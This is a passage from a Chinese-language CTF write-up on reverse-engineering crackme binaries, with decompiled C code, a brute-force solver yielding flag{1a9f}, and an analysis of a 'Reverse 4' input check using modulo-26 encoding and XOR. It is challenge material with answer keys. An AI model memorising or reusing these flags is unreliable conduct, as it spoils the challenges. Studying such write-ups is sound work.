punctuation\">(</span><span class=\"token string\">\"Error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>将该程序复制，穷举 v5 的值</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h&gt;</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;string&gt;</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    size_t v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-134h] BYREF</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-130h]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+14h] [rbp-12Ch]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">int</span> v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-128h]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">int</span> v9<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1Ch] [rbp-124h]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">int</span> v10<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-120h]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">int</span> v11<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+24h] [rbp-11Ch]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">int</span> v12<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+28h] [rbp-118h]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">int</span> v13<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+2Ch] [rbp-114h]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">int</span> v14<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+30h] [rbp-110h]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">int</span> v15<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+34h] [rbp-10Ch]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> __int64 v16<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+38h] [rbp-108h]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">int</span> v17<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+40h] [rbp-100h]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+60h] [rbp-E0h] BYREF</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">char</span> v19<span class=\"token punctuation\">[</span><span class=\"token number\">107</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+65h] [rbp-DBh] BYREF</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">char</span> dest<span class=\"token punctuation\">[</span><span class=\"token number\">104</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+D0h] [rbp-70h] BYREF</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> __int64 v21<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+138h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    v5 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        v7 <span class=\"token operator\">=</span> <span class=\"token number\">80</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        v8 <span class=\"token operator\">=</span> <span class=\"token number\">64227</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        v9 <span class=\"token operator\">=</span> <span class=\"token number\">226312059</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        v10 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1540056586</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        v11 <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        v12 <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        v13 <span class=\"token operator\">=</span> <span class=\"token number\">3833</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        v17<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v7<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        v17<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v8<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        v17<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v9<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        v17<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v10<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        v17<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v11 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">12</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> v12<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        v17<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        v17<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        v16 <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>v16 <span class=\"token operator\">+=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v17<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> v16 <span class=\"token operator\">&gt;</span> <span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">;</span> v16 <span class=\"token operator\">=</span> v15 <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>v16<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                v14 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>v16<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                v15 <span class=\"token operator\">=</span> v16 <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>v16 <span class=\"token operator\">==</span> <span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"OK\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        v5<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>程序输出结果为 <code>6815</code> ，十六进制为 <code>1a9f</code>  (十六进制输入有效)</p>\n<p>flag 为 <code>flag{1a9f}</code></p>\n<h2 id=\"逆向4\"><a class=\"anchor\" href=\"#逆向4\">#</a> 逆向 4</h2>\n<p>打开，字符串窗口可以看到 <code>请输入正确的数字:\\n</code> ，跟进到函数 <code>sub_140001170</code> ，得到</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  qword_140004618 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10u</span>i64<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  qword_140004620 <span class=\"token operator\">=</span> qword_140004618<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>qword_140004618 <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>i64<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">sub_140001020</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入正确的数字:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">sub_140001080</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%lld\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>__fastcall <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>sub_1400010E0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>根据这个结构，可以猜到 <code>sub_140001080</code>  为得到输入的数字， <code>sub_1400010E0</code>  为验证输入的数字</p>\n<p>继续跟进</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> __fastcall __noreturn <span class=\"token function\">sub_1400010E0</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">,</span> __int64 a2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// er9</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  __int64 v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// r8</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// r10</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">char</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// al</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  __int64 v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rbx</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int8 v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// cl</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">char</span> v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1Fh] [rbp-3F9h]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">char</span> v9<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-3F8h] BYREF</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span>a1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> a1 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    v4 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>v9<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token operator\">++</span>v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token operator\">++</span>v2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      a1 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>a4890572163qwe<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">26</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">/</span> <span class=\"token number\">26</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      v5 <span class=\"token operator\">=</span> a1<span class=\"token punctuation\">[</span>v3<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      v3 <span class=\"token operator\">/=</span> <span class=\"token number\">26</span>i64<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      a2 <span class=\"token operator\">=</span> v3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v4 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  v6 <span class=\"token operator\">=</span> v2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v6 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    v7 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v8 <span class=\"token operator\">+</span> v6<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token function\">sub_1400011E0</span><span class=\"token punctuation\">(</span>v7 <span class=\"token operator\">^</span> <span class=\"token number\">7u</span><span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token function\">sub_140001220</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>其中 v3 为输入的数字， <code>-26 * (v3 / 26)</code>  为 <code>v3 % 26</code>  的值， <code>v6</code>  即为模值对应的字符，并进行存储</p>\n<p>由此下面的 <code>while( v7 )</code>  中， <code>v8</code>  即为由模值取出来的各字符，将其与 7 异或后进入 sub_1400011E0，跟进，可能是将取出来的字符串存入开头申请的内存空间里，用于后面的比较。<s>不懂是什么功能，</s></p>\n<p>跟进 <code>sub_140001220</code></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> __noreturn <span class=\"token function\">sub_140001220</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  __int64 v0<span class=\"token punctuation\">;</span> <span class=\"token comment\">// r9</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// ecx</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  __int64 v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rdx</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">char</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// al</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// er8</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  __int64 v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// r9</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">char</span> v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// cl</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  v0 <span class=\"token operator\">=</span> qword_140004620<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token number\">0</span>i64<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    v3 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v0<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    v4 <span class=\"token operator\">=</span> v1 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    v5 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> aV4pY59<span class=\"token punctuation\">[</span>v2 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      v4 <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    qword_140004620 <span class=\"token operator\">=</span> v5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v5 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    v6 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    v7 <span class=\"token operator\">=</span> v4 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    v0 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v5 <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v6 <span class=\"token operator\">!=</span> aV4pY59<span class=\"token punctuation\">[</span>v2<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      v7 <span class=\"token operator\">=</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    qword_140004620 <span class=\"token operator\">=</span> v0<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v0 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      v2 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span>i64<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      v1 <span class=\"token operator\">=</span> v7<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v2 <span class=\"token operator\">&lt;</span> <span class=\"token number\">14</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">goto</span> LABEL_11<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  v7 <span class=\"token operator\">=</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>LABEL_11<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v7 <span class=\"token operator\">==</span> <span class=\"token number\">14</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token function\">sub_1400012E0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  <span class=\"token function\">sub_1400012B0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token 